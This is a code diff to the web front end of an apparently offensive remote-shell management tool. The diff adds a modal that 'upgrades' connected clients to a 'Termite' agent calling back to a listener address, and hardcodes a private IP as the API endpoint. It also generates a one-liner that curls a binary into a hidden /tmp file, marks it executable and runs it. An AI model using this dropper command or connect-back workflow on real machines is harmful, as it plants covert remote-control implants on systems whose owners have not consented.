@@ -18,6 +18,7 @@ import {
   Select,
   Descriptions,
   Collapse,
+  Modal,
 } from "antd";
 
 import { LockOutlined, UnlockOutlined } from '@ant-design/icons';
@@ -44,18 +45,12 @@ message.config({
 const { Header, Content, Sider } = Layout;
 
 let endPoint = window.location.host;
+endPoint = "172.20.16.130:7331"
 let baseUrl = ["http://", endPoint].join("");
 let apiUrl = [baseUrl, "/api"].join("");
 let wsUrl = ["ws://", endPoint, "/notify"].join("");
 
 
-function upgradeToTermite(clientHash, target) {
-  axios
-    .get(apiUrl + "/client/" + clientHash + "/upgrade/" + target)
-    .then((response) => {
-      console.log(response)
-    })
-}
 
 class App extends React.Component {
   constructor(props) {
@@ -64,10 +59,59 @@ class App extends React.Component {
       bottom: "bottomLeft",
       serversMap: null,
       serversList: [],
+      isModalVisible: false,
       currentServer: null,
+      connectBack: "",
       serverCreateHost: "0.0.0.0",
       serverCreatePort: Math.floor(Math.random() * 65536),
     };
+  }
+
+  upgradeToTermite(clientHash, target) {
+    if (target !== "") {
+      axios
+      .get(apiUrl + "/client/" + clientHash + "/upgrade/" + target)
+      .then((response) => {
+        console.log(response)
+      })
+    } else {
+      message.error("Invalid connect back termite listener address: " + target, 5);
+    }
+  }
+
+  showModal() {
+    this.setState({
+      isModalVisible: true,
+    });
+  };
+
+  handleOk(hash) {
+    this.upgradeToTermite(hash, this.state.connectBack)
+    this.setState({
+      isModalVisible: false,
+      connectBack: "",
+    })
+  };
+
+  handleCancel() {
+    this.setState({
+      isModalVisible: false,
+      connectBack: "",
+    })
+  };
+
+  generateProgressStatus(prog) {
+    if (prog < 0) {
+      return "exception"
+    } else if (prog === 0) {
+      return "normal"
+    } else if (prog > 0) {
+      if (prog >= 100) {
+        return "success"
+      } else {
+        return "active"
+      }
+    }
   }
 
   fetchData() {
@@ -202,9 +246,9 @@ class App extends React.Component {
           let bytesTotal = uploadingProgress.BytesTotal
 
           newServersMap = this.state.serversMap;
-          newServersMap[serverHash].clients[clientHash].progress = (bytesSent / bytesTotal) * 100;
+          newServersMap[serverHash].clients[clientHash].upload_progress = (bytesSent / bytesTotal) * 100;
 
-          if (newServersMap[serverHash].clients[clientHash].progress === 100) {
+          if (newServersMap[serverHash].clients[clientHash].upload_progress === 100) {
             newServersMap[serverHash].clients[clientHash].alert = "Upgrade successfully!"
           } else {
             newServersMap[serverHash].clients[clientHash].alert = filesize(bytesSent) + " / " + filesize(bytesTotal)
@@ -221,6 +265,8 @@ class App extends React.Component {
       message.error("WebSocket disconnected!", 5);
     };
   }
+
+
 
   render() {
 
@@ -288,26 +334,24 @@ class App extends React.Component {
         render: (data, line, index) => {
           let upgradeButton;
           if (line.CurrentProcessKey === undefined) {
-            let target = null
-            this.state.serversList.forEach(function(entry){
-              if (entry.encrypted) {
-                target = entry.host + ":" + entry.port
-              }
-            })
-            if (target == null) {
-              upgradeButton = <Button disabled={true} onClick={() => upgradeToTermite(line.hash, target)}>
-              Upgrade
-            </Button>
+            // let target = null
+            // this.state.serversList.forEach(function (entry) {
+            //   if (entry.encrypted) {
+            //     target = entry.host + ":" + entry.port
+            //   }
+            // })
+            // if (target == null) {
+            upgradeButton = <Button disabled={false} onClick={() => { this.showModal() }}>Upgrade</Button>
 
-            } else {
-              upgradeButton = <Button onClick={() => upgradeToTermite(line.hash, target)}>
-              Upgrade
-            </Button>
-            }
+            // // } else {
+            // //   upgradeButton = <Button onClick={() => {this.showModal()}}>
+            // //     Upgrade
+            // // </Button>
+            // }
           } else {
             upgradeButton = ""
           }
-    
+
           return (
             <>
               <Button>
@@ -320,26 +364,54 @@ class App extends React.Component {
               </a>
               </Button>
               {upgradeButton}
+              <Modal title="Basic Modal" visible={this.state.isModalVisible} onOk={() => this.handleOk(line.hash)} onCancel={() => this.handleCancel()}>
+                Select Termite Listeners:
+                <Select
+                  showSearch
+                  style={{ width: 200 }}
+                  placeholder="Select an termite listener"
+                  optionFilterProp="children"
+                  onChange={(value) => {
+                    this.setState({ connectBack: value });
+                  }}
+                  filterOption={(input, option) =>
+                    option.children.toLowerCase().indexOf(input.toLowerCase()) >= 0
+                  }
+                  defaultValue={this.state.connectBack}
+                >
+                  {this.state.serversList.map((entry) => {
+                      if (entry.encrypted) {
+                        return entry.interfaces.map((ifaddr)=>{
+                          let v = ifaddr + ":" + entry.port
+                          return <Option value={v}>{v}</Option>
+                        })
+                      }
+                      return ""
+                  })}
+                </Select>
+                Input Termite Listeners Manually:
+                <Input placeholder="1.3.3.7:13337" value={this.state.connectBack} onChange={(e)=>{this.setState({connectBack: e.target.value})}}/>
+              </Modal>
             </>
           );
         },
       },
       {
         title: "Progress",
-        dataIndex: "progress",
-        key: "progress",
+        dataIndex: "upload_progress",
+        key: "upload_progress",
         align: "center",
         render: (data, line, index) => {
           return <>
             <Alert message={line.alert === undefined ? "Press Upgrade to Proceed" : line.alert} type="success" />
-            <Progress percent={line.compiling_progress} size="small" status={line.compiling_progress === 100 ? "" : "active"} />
-            <Progress percent={line.compressing_progress} size="small" status={line.compressing_progress === 100 ? "" : "active"} />
-            <Progress percent={Math.round(line.progress)} size="small" status={line.progress === 100 ? "" : "active"} />
+            <Progress percent={line.compiling_progress} size="small" status={this.generateProgressStatus(line.compiling_progress)} />
+            <Progress percent={line.compressing_progress} size="small" status={this.generateProgressStatus(line.compressing_progress)} />
+            <Progress percent={Math.round(line.upload_progress)} size="small" status={this.generateProgressStatus(line.upload_progress)} />
           </>
         },
       }
     ];
-    
+
 
     let interfaceMenu;
     if (this.state.currentServer === null) {
@@ -405,7 +477,7 @@ class App extends React.Component {
             Object.values(this.state.currentServer.interfaces).map((value, index) => {
               filename = "/tmp/." + randomstring.generate(4)
               target = value + ":" + this.state.currentServer.port
-              command = "curl -fsSL " + url + "/termite/"  + target + " -o " + filename + " && chmod +x " + filename + " && " + filename
+              command = "curl -fsSL " + url + "/termite/" + target + " -o " + filename + " && chmod +x " + filename + " && " + filename
               data.push({ target: value + ":" + this.state.currentServer.port, command: command })
               return command
             })
